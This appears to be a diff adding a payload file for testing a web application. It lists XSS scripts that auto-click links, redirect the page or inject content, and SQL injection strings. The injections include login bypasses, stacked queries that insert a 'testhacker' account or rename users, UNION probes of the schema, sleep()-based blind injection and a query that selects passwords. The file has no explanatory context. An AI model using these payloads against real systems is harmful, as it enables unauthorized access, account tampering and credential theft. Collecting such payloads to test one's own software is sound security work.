@@ -1,0 +1,36 @@
+
+<script class="xss">$('.xss').parents().eq(0).find('a').click();</script>Hello
+
+<script>window.location.replace('google.com');</script>
+
+<script> 
+    $(function(){
+      $("#DivContent").$load("rickroll.html"); 
+    });
+    </script> 
+  <div id="DivContent"></div>
+
+' OR '1'='1'; INSERT INTO registration, users (username, password, email) VALUES ('testhacker', '179ad45c6ce2cb97cf1029e212046e81', 'testemail@testemail.com');#
+
+testuser'; UPDATE users SET username = 'testuser4hacked' WHERE username = 'testuser4
+
+testuser'; SELECT * FROM users WHERE username = 'testuser2
+
+testuser'; UPDATE users SET username = 'testuser4hacked' WHERE id = 4;#
+
+testuser'; UPDATE users SET id=500 WHERE username='testuser4';#
+
+' union select table_schema from information_schema.tables union select '1
+
+' or '1'='1';#
+' or 'a'='a';#
+
+testuser' and 0 = sleep(2);#
+
+' or 'a'='a' and 0 = sleep(2);#
+
+testuser' union (select 1,2,3 from dual);#
+
+testuser' UNION (SELECT 1,2,3 FROM DUAL);-- 
+
+testuser' and 0 = sleep(2); SELECT password FROM users WHERE username = 'testuser';#
